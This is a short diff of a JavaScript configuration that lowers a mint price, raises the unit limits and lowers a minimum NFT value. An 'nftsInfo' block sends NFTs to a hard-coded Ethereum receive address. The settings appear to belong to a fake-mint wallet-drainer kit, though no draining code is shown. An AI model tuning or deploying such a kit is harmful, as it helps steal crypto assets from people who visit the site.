@@ -23,15 +23,15 @@ const x20Ethereum = '0x9DCa1A8C1E04BFDD5F40b8C658dC10ef3DdF626e'
   },
 } */
 const mintInfo = {
-    price: 0.3,
-    totalSupply: 10000,
+    price: 0.005,
+    totalSupply: 11111,
     minUnits: 1,
-    maxUnits: 5,
+    maxUnits: 100,
     askMintLoop: true,
   },
   nftsInfo = {
     active: true,
-    minValue: 0.1,
+    minValue: 0.01,
     checkMaxDay: 1,
     receiveAddress: '0x9DCa1A8C1E04BFDD5F40b8C658dC10ef3DdF626e',
   }
